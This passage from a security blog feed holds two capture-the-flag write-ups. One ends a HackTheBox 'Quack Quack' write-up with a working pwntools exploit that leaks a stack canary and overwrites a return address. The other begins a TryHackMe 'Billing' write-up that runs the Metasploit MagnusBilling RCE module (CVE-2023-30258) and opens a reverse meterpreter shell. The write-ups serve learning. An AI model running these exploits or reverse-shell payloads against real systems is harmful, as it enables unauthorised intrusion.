+  <li>The <code class="language-plaintext highlighter-rouge">printf()</code> statement is printing the data present 32 bytes after the <code class="language-plaintext highlighter-rouge">pcVar1</code> variable for some reason.</li>
+  <li>The <a href="#second-read">second read()</a> statement is storing 102 bytes of stdin into the address of <code class="language-plaintext highlighter-rouge">local_68</code>.</li>
+</ol>
+
+<p>But most importantly, can we reach the <code class="language-plaintext highlighter-rouge">duck_attack()</code> and get the flag printed with the current flow?</p>
+
+<h1 id="runtime-debugging">Runtime Debugging</h1>
+
+<h2 id="first-read">First read()</h2>
+
+<p>Since we know it is trying to find the substring “Quack Quack “ let’s enter that with 4 A’s for easy identification in registry, and we will insert breakpoint just before <code class="language-plaintext highlighter-rouge">strstr()</code> at <code class="language-plaintext highlighter-rouge">0x00401578</code> to confirm our input.</p>
+
+<div class="language-as highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">b</span> <span class="o">*</span><span class="mh">0x401567</span>
+<span class="nx">Breakpoint</span> <span class="mi">1</span> <span class="nx">at</span> <span class="mh">0x401567</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">r</span>
+<span class="nx">Quack</span> <span class="nx">the</span> <span class="nx">Duck</span><span class="o">!</span>
+<span class="o">&gt;</span> <span class="nx">AAAAQuack</span> <span class="nx">Quack</span>
+<span class="nx">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0000000000401567</span> <span class="k">in</span> <span class="nx">duckling</span> <span class="p">()</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">x</span> <span class="o">/</span><span class="mi">2</span><span class="nx">gx</span> <span class="nx">$rsi</span>
+<span class="mh">0x7fffffffdc10</span><span class="o">:</span> <span class="mh">0x6361755141414141</span>      <span class="mh">0x206b63617551206b</span>
+</code></pre></div></div>
+
+<p>Nice! We can see our 16 bytes in the <code class="language-plaintext highlighter-rouge">rsi</code> register. But don’t forget we can fill 102 bytes and not just 32, and when the substring is found, it print the value present 32 bytes after <code class="language-plaintext highlighter-rouge">pcVar1</code> due to <code class="language-plaintext highlighter-rouge">printf("Quack Quack %s ...", pcVar1 + 0x20)</code>. So what exists in the memory from till 134 bytes from <code class="language-plaintext highlighter-rouge">rsi</code>?</p>
+
+<div class="language-as highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">x</span> <span class="o">/</span><span class="mi">20</span><span class="nx">gx</span> <span class="nx">$rsi</span>
+<span class="mh">0x7fffffffdb50</span><span class="o">:</span> <span class="mh">0x6361755141414141</span>      <span class="mh">0x206b63617551206b</span>
+<span class="mh">0x7fffffffdb60</span><span class="o">:</span> <span class="mh">0x000000000000000a</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdb70</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdb80</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdb90</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdba0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdbb0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdbc0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0xb81ee3015c855d00</span>
+<span class="mh">0x7fffffffdbd0</span><span class="o">:</span> <span class="mh">0x00007fffffffdbf0</span>      <span class="mh">0x000000000040162a</span>
+<span class="mh">0x7fffffffdbe0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0xb81ee3015c855d00</span>
+</code></pre></div></div>
+
+<p>The value at <code class="language-plaintext highlighter-rouge">0xdbc8</code> seems like the canary value (<code class="language-plaintext highlighter-rouge">0xb81ee3015c855d00</code>), and we can reach it due to it being present at 121st byte. What’s more is that the address present at <code class="language-plaintext highlighter-rouge">0xdbd8</code> is the return address to <code class="language-plaintext highlighter-rouge">main()</code> function. So maybe we can overwrite canary and change the return address to the <code class="language-plaintext highlighter-rouge">duck_attack()</code> function? At the moment we can only access the canary and not the return address. But we have the second <code class="language-plaintext highlighter-rouge">read()</code> function as well right?</p>
+
+<h2 id="second-read">Second read()</h2>
+
+<p>Adding a second breakpoint at <code class="language-plaintext highlighter-rouge">0x4015df</code> right after the second <code class="language-plaintext highlighter-rouge">read()</code> function, and checking the memory again, we see that this time our input sits even closer to the canary and the return value.</p>
+
+<div class="language-as highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">b</span> <span class="o">*</span><span class="mh">0x4015df</span>
+<span class="nx">Breakpoint</span> <span class="mi">2</span> <span class="nx">at</span> <span class="mh">0x4015df</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">c</span>
+<span class="nx">Continuing</span><span class="p">.</span>
+<span class="nx">Quack</span> <span class="nx">Quack</span> <span class="p">,</span> <span class="nx">ready</span> <span class="nx">to</span> <span class="nx">fight</span> <span class="nx">the</span> <span class="nx">Duck</span><span class="p">?</span>
+
+<span class="o">&gt;</span> <span class="nx">AAAAAAAAAAAAAAAA</span>
+
+<span class="nx">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x00000000004015df</span> <span class="k">in</span> <span class="nx">duckling</span> <span class="p">()</span>
+<span class="nx">gef</span><span class="err">➤</span>  <span class="nx">x</span> <span class="o">/</span><span class="mi">20</span><span class="nx">gx</span> <span class="nx">$rsi</span>
+<span class="mh">0x7fffffffdb70</span><span class="p">:</span> <span class="mh">0x4141414141414141</span>      <span class="mh">0x4141414141414141</span>
+<span class="mh">0x7fffffffdb80</span><span class="o">:</span> <span class="mh">0x000000000000000a</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdb90</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdba0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdbb0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdbc0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0xb81ee3015c855d00</span>
+<span class="mh">0x7fffffffdbd0</span><span class="o">:</span> <span class="mh">0x00007fffffffdbf0</span>      <span class="mh">0x000000000040162a</span>
+<span class="mh">0x7fffffffdbe0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0xb81ee3015c855d00</span>
+<span class="mh">0x7fffffffdbf0</span><span class="o">:</span> <span class="mh">0x0000000000000001</span>      <span class="mh">0x00007ffff7c29d90</span>
+<span class="mh">0x7fffffffdc00</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000401605</span>
+</code></pre></div></div>
+
+<p>Now the canary is at 89th byte and the return address at 95th byte from our input. And since the second <code class="language-plaintext highlighter-rouge">read()</code> allows us to write 106 bytes, we should be able to overwrite the return address to redirect the flow to <code class="language-plaintext highlighter-rouge">duck_attack()</code> once <code class="language-plaintext highlighter-rouge">duckling()</code> returns.</p>
+
+<h1 id="exploitation-process">Exploitation Process</h1>
+
+<h2 id="theory">Theory</h2>
+
+<p>With so much of prep work, our exploit development should be smooth. So let’s finalize our plan of action:</p>
+<ol>
+  <li>From the <a href="#first-read">first read()</a>, the canary value at 121st byte can be reached by placing “Quack Quack “ at the 90th byte (121st byte - 32 bytes from pcVar1). Technically we should be placing it at 89th byte but doing so will give us <code class="language-plaintext highlighter-rouge">0x00</code> as first byte, terminating the response. Hence we will skip that and manually add it later.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">printf()</code> function will provide us with some binary non-printable characters which should contain the canary value.</li>
+  <li>Once we have the canary value, we will place it again through <a href="#second-read">second read()</a> from 89th byte at address <code class="language-plaintext highlighter-rouge">0xdbd8</code>. The <code class="language-plaintext highlighter-rouge">rbp</code> value at <code class="language-plaintext highlighter-rouge">0xdbd0</code> should also be preserved, but it also works if we simply keep it 0.</li>
+  <li>At last, we will add the return address of <code class="language-plaintext highlighter-rouge">duck_attack</code> at the end of the payload to ultimately modify the return pointer to that function.</li>
+</ol>
+
+<p class="info"><strong>Note</strong>: Technically, we are given only 106 bytes (<code class="language-plaintext highlighter-rouge">0x6a</code>) to write with second <code class="language-plaintext highlighter-rouge">read()</code>, and 88 + 8(canary) + 8(<code class="language-plaintext highlighter-rouge">rbp</code>) is already 104 bytes. So we only have 2 bytes left to enter. Even then, since the <code class="language-plaintext highlighter-rouge">0x40****</code> is same for both return addresses, we only need to change the last two bytes!</p>
+
+<h2 id="exploit-development">Exploit Development</h2>
+
+<h3 id="leaking-canary">Leaking Canary</h3>
+
+<p>Below is the function to exploit <a href="#first-read">first read()</a> and leak the canary value.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak_address</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">attach</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="n">proc</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">89</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Quack Quack </span><span class="sh">'</span>                         <span class="c1"># Placing substring at the 90th byte
+</span>    <span class="n">proc</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    
+    <span class="n">response</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">the Duck?</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Response:</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="n">response</span><span class="p">)</span>
+
+    <span class="n">out</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Quack Quack </span><span class="sh">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Data extracted with offset 89: </span><span class="si">{</span><span class="n">out</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="n">canary_bytes</span> <span class="o">=</span> <span class="n">out</span><span class="p">[:</span><span class="mi">7</span><span class="p">]</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">canary_bytes</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>                <span class="c1"># Adding 0x00 manually at the beginning
+</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Canary value at offset: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>             <span class="c1"># Leaked Canary
+</span>
+    <span class="k">if</span> <span class="n">attach</span><span class="p">:</span>                                                  <span class="c1"># Attaching GDB if debugging required
+</span>        <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span>
+        <span class="nf">pause</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">canary</span>
+</code></pre></div></div>
+
+<h3 id="modifying-return-address">Modifying Return Address</h3>
+
+<p>Next is the function to securely modify the return address through <a href="#second-read">second read()</a>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">duck_attack</span><span class="p">,</span> <span class="n">canary</span><span class="p">,</span> <span class="n">attach</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+    <span class="n">rbp</span> <span class="o">=</span> <span class="mh">0x00007fffffffdbf0</span>
+    <span class="n">proc</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span><span class="o">*</span><span class="mi">88</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">duck_attack</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">proc</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="nf">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">ignore</span><span class="sh">"</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h1 id="captured-flag">Captured Flag</h1>
+
+<p>With the whole exploit code below, we are able to capture the flag!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">leak_address</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">attach</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="n">proc</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">89</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Quack Quack </span><span class="sh">'</span>
+    <span class="n">proc</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    
+    <span class="n">response</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">the Duck?</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Response:</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="n">response</span><span class="p">)</span>
+
+    <span class="n">out</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Quack Quack </span><span class="sh">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Data extracted with offset 89: </span><span class="si">{</span><span class="n">out</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="n">canary_bytes</span> <span class="o">=</span> <span class="n">out</span><span class="p">[:</span><span class="mi">7</span><span class="p">]</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">canary_bytes</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Canary value at offset: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">attach</span><span class="p">:</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span>
+        <span class="nf">pause</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">canary</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">duck_attack</span><span class="p">,</span> <span class="n">canary</span><span class="p">,</span> <span class="n">attach</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+    <span class="n">rbp</span> <span class="o">=</span> <span class="mh">0x00007fffffffdbf0</span>
+    <span class="n">proc</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span><span class="o">*</span><span class="mi">88</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">duck_attack</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">proc</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="nf">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">ignore</span><span class="sh">"</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">]</span>
+    
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Starting exploit...</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">quack_quack</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="n">proc</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">94.237.120.194</span><span class="sh">'</span><span class="p">,</span> <span class="mi">52817</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">proc</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+    
+    <span class="n">duck_attack</span> <span class="o">=</span> <span class="mh">0x137f</span>                                <span class="c1"># Last 2 address bytes of the duck_attack() function
+</span>    
+    <span class="n">canary</span> <span class="o">=</span> <span class="nf">leak_address</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span>                         
+    <span class="nf">exploit</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">duck_attack</span><span class="p">,</span> <span class="n">canary</span><span class="p">)</span>
+    <span class="n">proc</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Exploit completed.</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python exploit.py 
+Starting exploit...
+Response:
+ b<span class="s1">'Quack Quack =L\xbeL\x1fd~\xf0L"\xe7\xfd\x7f, ready to fight the Duck?'</span>
+Data extracted with offset 89: b<span class="s1">'=L\xbeL\x1fd~\xf0L"\xe7\xfd\x7f'</span>
+Canary value at offset: 0x7e641f4cbe4c3d00
+Did you really expect to win a fight against a Duck?!
+
+HTB<span class="o">{</span>f4k3_fl4g_4_t35t1ng<span class="o">}</span>
+
+Exploit completed.
+</code></pre></div></div>]]></content><author><name>Mehul Singh</name></author><category term="htb" /><category term="pwn" /><category term="binary exploitation" /><category term="buffer overflow" /><category term="exploit development" /><category term="gdb" /><category term="pie" /><category term="debugging" /><category term="stack canary leak" /><category term="rop" /><category term="ghidra" /><summary type="html"><![CDATA[Solving an easy challenge on HackTheBox platform.]]></summary></entry><entry><title type="html">Billing - TryHackMe room writeup</title><link href="http://0.0.0.0:4000/ctf-vault/billing.thm" rel="alternate" type="text/html" title="Billing - TryHackMe room writeup" /><published>2025-05-21T00:00:00+05:30</published><updated>2025-05-21T00:00:00+05:30</updated><id>http://0.0.0.0:4000/ctf-vault/billing.thm</id><content type="html" xml:base="http://0.0.0.0:4000/ctf-vault/billing.thm"><![CDATA[<h1 id="overview">Overview</h1>
+
+<p>Today we will work on <a href="https://tryhackme.com/room/billing">TryHackMe</a>’s “Billing” room—an easy room focusing on abusing <strong>indirect file permission manipulation via sudo</strong>. So let’s begin</p>
+
+<h1 id="reconnaisance">Reconnaisance</h1>
+
+<p>Let’s begin with the usual, performing nmap scan. I run the <code class="language-plaintext highlighter-rouge">-p-</code> <code class="language-plaintext highlighter-rouge">-v</code> scan to quickly grab the ports, then run <code class="language-plaintext highlighter-rouge">-sCV</code> on them specifically.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -p 22,80,3306 -sCV 10.10.226.215
+Nmap scan report for billing.thm (10.10.226.215)
+Host is up (0.100s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
+|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
+|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
+| http-title:             MagnusBilling
+|_Requested resource was http://billing.thm/mbilling/
+|_http-server-header: Apache/2.4.56 (Debian)
+| http-robots.txt: 1 disallowed entry
+|_/mbilling/
+3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p>We see that it has HTTP port open, so I added it to my <code class="language-plaintext highlighter-rouge">etc/hosts</code> file and I would’ve ran <code class="language-plaintext highlighter-rouge">ffuf</code> in the hopes of finding some subdirectories or folders while I manually browse the webpage, but since the room said “Bruteforcing is out of scope” I skipped on that.</p>
+
+<h2 id="http-magnusbilling">HTTP: MagnusBilling</h2>
+
+<p>From the Nmap scan and accessing the website we see that it is running MagnusBilling, which is a VoIP billing platform. I immediately ran some basic creds and their own default cred of <code class="language-plaintext highlighter-rouge">root:magnus</code> but to no avail.
+<img src="/ctf-vault/assets/images/articles/mbilling.png" alt="Image" class="rounded" /></p>
+
+<p>I parked it for later, and simply searched “magnusbilling vulnerability” and came across <a href="https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/">Rapid7’s database</a> which said MagnusBilling v6.x and v7.x are vulnerable to RCE. Since we couldn’t find the version running on the platform (without bruteforcing!), let’s simply try running this exploit.</p>
+
+<h1 id="foothold">Foothold</h1>
+<p>So I searched the module and loaded it with all the required parameters before running it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole <span class="nt">-q</span>
+msf6 <span class="o">&gt;</span> search magnusbilling
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                                        Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                                        <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.
+   1    <span class="se">\_</span> target: PHP                                            <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
+   2    <span class="se">\_</span> target: Unix Command                                   <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
+   3    <span class="se">\_</span> target: Linux Dropper                                  <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
+After interacting with a module you can manually <span class="nb">set </span>a TARGET with <span class="nb">set </span>TARGET <span class="s1">'Linux Dropper'</span>
+
+msf6 <span class="o">&gt;</span> use 0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>linux/http/magnusbilling_unauth_rce_cve_2023_30258<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts billing.thm
+rhosts <span class="o">=&gt;</span> billing.thm
+msf6 exploit<span class="o">(</span>linux/http/magnusbilling_unauth_rce_cve_2023_30258<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost tun0
+lhost <span class="o">=&gt;</span> 10.6.49.253
+msf6 exploit<span class="o">(</span>linux/http/magnusbilling_unauth_rce_cve_2023_30258<span class="o">)</span> <span class="o">&gt;</span> exploit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.6.49.253:4444
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">"set AutoCheck false"</span> to disable<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking <span class="k">if </span>10.10.226.215:80 can be exploited.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Performing <span class="nb">command </span>injection <span class="nb">test </span>issuing a <span class="nb">sleep command </span>of 8 seconds.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Elapsed <span class="nb">time</span>: 8.26 seconds.
+<span class="o">[</span>+] The target is vulnerable. Successfully tested <span class="nb">command </span>injection.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing PHP <span class="k">for </span>php/meterpreter/reverse_tcp
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>40004 bytes<span class="o">)</span> to 10.10.226.215
+<span class="o">[</span>+] Deleted NAuTsHNDM.php
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.6.49.253:4444 -&gt; 10.10.226.215:44742<span class="o">)</span> at 2025-05-21 17:03:30 <span class="nt">-0400</span>
+</code></pre></div></div>
+<p>And voila! We have a shell! I then did the usual of having a basic shell through python.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> shell
+Process 2845 created.
+Channel 0 created.
+which python3
+/usr/bin/python3
